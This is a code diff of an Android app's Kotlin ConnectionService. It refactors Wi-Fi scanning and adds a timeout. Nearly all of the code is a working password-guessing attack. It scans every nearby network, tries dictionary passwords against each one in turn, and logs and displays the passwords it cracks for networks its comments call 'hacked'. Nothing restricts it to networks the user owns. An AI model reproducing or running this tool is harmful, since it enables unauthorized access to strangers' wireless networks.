@@ -2,17 +2,16 @@ package com.practice.securewifi.connect.service
 
 import android.Manifest
 import android.app.*
-import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Color
+import android.net.wifi.ScanResult
 import android.net.wifi.WifiConfiguration
 import android.net.wifi.WifiManager
 import android.os.*
 import androidx.annotation.RequiresApi
-import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
@@ -28,8 +27,10 @@ import com.practice.securewifi.data.interactor.CustomPasswordListInteractor
 import com.practice.securewifi.data.interactor.FixedPasswordListsInteractor
 import com.practice.securewifi.data.repository.FixedPasswordListsRepository
 import com.practice.securewifi.app.core.util.WifiManagerProvider
+import com.practice.securewifi.scan_feature.WifiScanManager
 import kotlinx.coroutines.*
 import org.koin.android.ext.android.inject
+import timber.log.Timber
 
 class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyListener {
 
@@ -37,11 +38,9 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
 
     private var connection: Job = Job()
 
-    private var wifiScanReceiverRegistered = false
-
     private lateinit var wifiManager: WifiManager
 
-    private lateinit var wifiScanReceiver: BroadcastReceiver
+    private var wifiScanManager: WifiScanManager? = null
 
     private lateinit var connectivityActionReceiver: ConnectivityActionReceiver
 
@@ -56,6 +55,8 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
     private var updateListener: UpdateListener? = null
 
     private val coroutineScope = CoroutineScope(Dispatchers.IO)
+
+    private var timeoutJob: Job = Job()
 
     private var latestCommand: Command = Command.StartConnections
     private var latestMessage: Command? = null
@@ -99,7 +100,7 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
             update(Command.PrepareForConnections)
             startScanningForNearbyWifi()
         } else {
-            unregisterWifiScanReceiverIfRegistered()
+            wifiScanManager?.stop()
             stopConnections()
         }
         return START_NOT_STICKY
@@ -107,7 +108,7 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
 
     override fun onDestroy() {
         unregisterReceiver(connectivityActionReceiver)
-        unregisterWifiScanReceiverIfRegistered()
+        wifiScanManager?.stop()
         super.onDestroy()
     }
 
@@ -224,43 +225,30 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
     }
 
     private fun startScanningForNearbyWifi() {
-        wifiScanReceiver = object : BroadcastReceiver() {
 
-            override fun onReceive(context: Context, intent: Intent) {
-                val success = intent.getBooleanExtra(
-                    WifiManager.EXTRA_RESULTS_UPDATED, false
-                )
-                if (success) {
-                    scanSuccess()
-                } else {
-                    scanFailure()
-                }
-                unregisterWifiScanReceiverIfRegistered()
+        wifiScanManager = object : WifiScanManager(this@ConnectionService) {
+            override fun onScanSuccess(scanResults: List<ScanResult>) {
+                scanSuccess(scanResults)
+            }
+
+            override fun onScanFailure(oldScanResults: List<ScanResult>) {
+                scanFailure()
             }
         }
+        wifiScanManager?.startScan()
 
-        registerWifiScanReceiver()
-
-        wifiManager.startScan()
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            unregisterWifiScanReceiverIfRegistered()
+        // Timeout if connections didn't start in 5 seconds
+        timeoutJob.cancel()
+        timeoutJob = coroutineScope.launch {
+            delay(START_CONNECTIONS_TIMEOUT)
+            wifiScanManager?.stop()
             if (!connection.isActive) {
                 stopConnections()
             }
-        }, 5000)
+        }
     }
 
-    private fun scanSuccess() {
-        if (ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            update(Command.AskForAccessFineLocationPermission)
-            return
-        }
-        val nearbyWifiPoints = wifiManager.scanResults
+    private fun scanSuccess(nearbyWifiPoints: List<ScanResult>) {
 
         val wifiSSIDs = nearbyWifiPoints.filter {
             it.SSID != "" /*&& WifiManager.calculateSignalLevel(
@@ -269,79 +257,84 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
             ) > 6*/
         }.sortedByDescending { it.level }.map { it.SSID }
 
+        connection = coroutineScope.launch {
+            attemptConnections(wifiSSIDs)
+        }
+    }
+
+    private suspend fun attemptConnections(wifiSSIDs: List<String>) {
         var correctPassword = ""
         var passwordCountNeeded = 0
 
-        connection = coroutineScope.launch {
+        withContext(Dispatchers.Main) {
+            update(Command.StartConnections)
+        }
+        foundPassword = false
+        var networkCount = 0
+        for (networkSSID in wifiSSIDs) {
+            networkCount++
+            // If password was found during this search
+            if (foundPassword) break
 
-            withContext(Dispatchers.Main) {
-                update(Command.StartConnections)
+            val wifi = wifiCheckResultInteractor.getWifiCheckResult(networkSSID)
+            // If this network hasn't ever been a subject to hacking, save it
+            if (wifi == null) {
+                wifiCheckResultInteractor.insertWifiCheckResult(WifiCheckResult(networkSSID, null))
+            } else if (wifi.correctPassword != null) {
+                // If this particular network has already been hacked
+                continue
             }
-            foundPassword = false
-            var networkCount = 0
-            for (networkSSID in wifiSSIDs) {
-                networkCount++
-                // If password was found during this search
-                if (foundPassword) break
+            val triedPasswords = triedPasswordsInteractor.getTriedPasswordsForWifi(networkSSID)
 
-                val wifi = wifiCheckResultInteractor.getWifiCheckResult(networkSSID)
-                // If this network hasn't ever been a subject to hacking, save it
-                if (wifi == null) {
-                    wifiCheckResultInteractor.insertWifiCheckResult(WifiCheckResult(networkSSID, null))
-                } else if (wifi.correctPassword != null) {
-                    // If this particular network has already been hacked
-                    continue
-                }
-                val triedPasswords = triedPasswordsInteractor.getTriedPasswordsForWifi(networkSSID)
+            val conf = WifiConfiguration()
+            conf.SSID = "\"" + networkSSID + "\"" // String should contain ssid in quotes
 
-                val conf = WifiConfiguration()
-                conf.SSID = "\"" + networkSSID + "\"" // String should contain ssid in quotes
+            val networkPasswords = getPasswordsList(networkSSID)
+            var passwordCount = 0
 
-                val networkPasswords = getPasswordsList(networkSSID)
-                var passwordCount = 0
+            for (networkPass in networkPasswords) {
+                passwordCount++
 
-                for (networkPass in networkPasswords) {
-                    passwordCount++
+                // If this password has already been checked for this wifi skip it
+                if (triedPasswords.contains(networkPass)) continue
 
-                    // If this password has already been checked for this wifi skip it
-                    if (triedPasswords.contains(networkPass)) continue
-
-                    withContext(Dispatchers.Main) {
-                        update(
-                            Command.ShowMessageToUser(
-                                getString(
-                                    R.string.attempting_to_connect,
-                                    networkSSID,
-                                    networkCount, // count of networks already checked
-                                    wifiSSIDs.size, // count of networks need to be checked
-                                    networkPass, // password currently being tried
-                                    passwordCount, // count of passwords already tried
-                                    networkPasswords.size, // password count for wifi
-                                    60 / (INTERVAL / 1000), // passwords a minute
-                                )
-                            )
-                        )
-                        updateNotification(
-                            getString(R.string.performing_connections),
+                withContext(Dispatchers.Main) {
+                    update(
+                        Command.ShowMessageToUser(
                             getString(
-                                R.string.attempting_to_connect_notification,
+                                R.string.attempting_to_connect,
                                 networkSSID,
                                 networkCount, // count of networks already checked
                                 wifiSSIDs.size, // count of networks need to be checked
                                 networkPass, // password currently being tried
                                 passwordCount, // count of passwords already tried
-                                networkPasswords.size // password count for wifi
+                                networkPasswords.size, // password count for wifi
+                                60 / (INTERVAL / 1000), // passwords a minute
                             )
                         )
-                    }
+                    )
+                    updateNotification(
+                        getString(R.string.performing_connections),
+                        getString(
+                            R.string.attempting_to_connect_notification,
+                            networkSSID,
+                            networkCount, // count of networks already checked
+                            wifiSSIDs.size, // count of networks need to be checked
+                            networkPass, // password currently being tried
+                            passwordCount, // count of passwords already tried
+                            networkPasswords.size // password count for wifi
+                        )
+                    )
+                }
 
-                    conf.preSharedKey = "\"" + networkPass + "\""
-                    // only works for API < 29
-                    val netId = wifiManager.addNetwork(conf)
-                    if (netId != -1) {
-                        wifiManager.disconnect()
-                        wifiManager.enableNetwork(netId, true)
-                    } else {
+                conf.preSharedKey = "\"" + networkPass + "\""
+                // only works for API < 29
+                val netId = wifiManager.addNetwork(conf)
+                if (netId != -1) {
+                    wifiManager.disconnect()
+                    wifiManager.enableNetwork(netId, true)
+                } else {
+                    try {
                         val list = wifiManager.configuredNetworks
                         for (network in list) {
                             if (network.SSID != null && network.SSID == "\"" + networkSSID + "\"") {
@@ -351,66 +344,69 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
                                 break
                             }
                         }
+                    } catch (e: SecurityException) {
+                        Timber.tag(TAG).e(e)
+                        onNotGivenPermission()
                     }
-                    delay(INTERVAL)
-
-                    triedPasswordsInteractor.insertAttemptedPasswordForWifi(
-                        networkPass,
-                        networkSSID,
-                    )
-
-                    if (foundPassword) {
-                        correctPassword = networkPass
-                        passwordCountNeeded = passwordCount
-                        wifiCheckResultInteractor.insertWifiCheckResult(
-                            WifiCheckResult(
-                                networkSSID,
-                                correctPassword
-                            )
-                        )
-                        break
-                    }
-
                 }
+                delay(INTERVAL)
+
+                triedPasswordsInteractor.insertAttemptedPasswordForWifi(
+                    networkPass,
+                    networkSSID,
+                )
+
                 if (foundPassword) {
-                    withContext(Dispatchers.Main) {
-                        update(
-                            Command.ShowMessageToUser(
-                                getString(
-                                    R.string.password_hacking_results,
-                                    networkSSID,
-                                    correctPassword,
-                                    passwordCountNeeded
-                                )
-                            )
+                    correctPassword = networkPass
+                    passwordCountNeeded = passwordCount
+                    wifiCheckResultInteractor.insertWifiCheckResult(
+                        WifiCheckResult(
+                            networkSSID,
+                            correctPassword
                         )
-                        showNotification(
-                            getString(R.string.connection_attempts_ended_success),
-                            getString(
-                                R.string.password_hacking_results_notification,
-                                networkSSID,
-                                correctPassword
-                            )
-                        )
-                    }
+                    )
+                    break
                 }
+
             }
-            if (!foundPassword) {
+            if (foundPassword) {
                 withContext(Dispatchers.Main) {
                     update(
                         Command.ShowMessageToUser(
-                            getString(R.string.couldnt_find_password)
+                            getString(
+                                R.string.password_hacking_results,
+                                networkSSID,
+                                correctPassword,
+                                passwordCountNeeded
+                            )
                         )
                     )
                     showNotification(
-                        getString(R.string.connection_attempts_ended_nothing_found),
-                        getString(R.string.couldnt_find_password_notification)
+                        getString(R.string.connection_attempts_ended_success),
+                        getString(
+                            R.string.password_hacking_results_notification,
+                            networkSSID,
+                            correctPassword
+                        )
                     )
                 }
             }
+        }
+        if (!foundPassword) {
             withContext(Dispatchers.Main) {
-                stopConnections()
+                update(
+                    Command.ShowMessageToUser(
+                        getString(R.string.couldnt_find_password)
+                    )
+                )
+                showNotification(
+                    getString(R.string.connection_attempts_ended_nothing_found),
+                    getString(R.string.couldnt_find_password_notification)
+                )
             }
+        }
+        withContext(Dispatchers.Main) {
+            stopConnections()
         }
     }
 
@@ -419,18 +415,8 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
         stopConnections()
     }
 
-    private fun registerWifiScanReceiver() {
-        val intentFilter = IntentFilter()
-        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
-        registerReceiver(wifiScanReceiver, intentFilter)
-        wifiScanReceiverRegistered = true
-    }
-
-    private fun unregisterWifiScanReceiverIfRegistered() {
-        if (wifiScanReceiverRegistered) {
-            unregisterReceiver(wifiScanReceiver)
-            wifiScanReceiverRegistered = false
-        }
+    private fun onNotGivenPermission() {
+        stopConnections()
     }
 
     private fun stopConnections() {
@@ -497,6 +483,10 @@ class ConnectionService : Service(), ConnectivityActionReceiver.OnSampleReadyLis
 
         private const val INTERVAL = 3000L
 
+        private const val START_CONNECTIONS_TIMEOUT = 5000L
+
         const val PASSWORD_LIST_PARAMETER = "PasswordList"
+
+        val TAG: String = ConnectionService::class.java.simpleName
     }
 }
